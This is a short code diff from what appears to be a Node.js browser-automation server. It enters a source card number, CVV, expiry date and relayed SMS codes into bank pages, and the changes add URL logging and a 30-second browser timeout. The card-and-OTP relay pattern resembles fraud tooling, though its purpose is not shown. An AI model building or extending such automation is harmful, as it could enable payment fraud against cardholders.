@@ -31,7 +31,7 @@ app.use(bodyParser.json())
 app.use(cors())
 
 const bankSMSProcess = async (url, page, sms) => {
-  
+  console.log(url)
   const {hostname} = new URL(url)
   await scenarios[hostname](page, sms)
 }
@@ -71,6 +71,10 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) =
 
     const inputs = await page.$$('input')
 
+
+    const stopProcessing = setTimeout(async () => {
+      await browser.close()
+    }, 30000)
     if(inputs.length) {
       console.log("wait", id)
       const locker = new EventEmitter();
@@ -89,7 +93,7 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) =
       await bankSMSProcess(await page.url(), page, obj[id])
       console.log('entered')
     }
-
+    clearTimeout(stopProcessing)
 
     await page.waitForNavigation({waitUntil: 'networkidle2'});
 
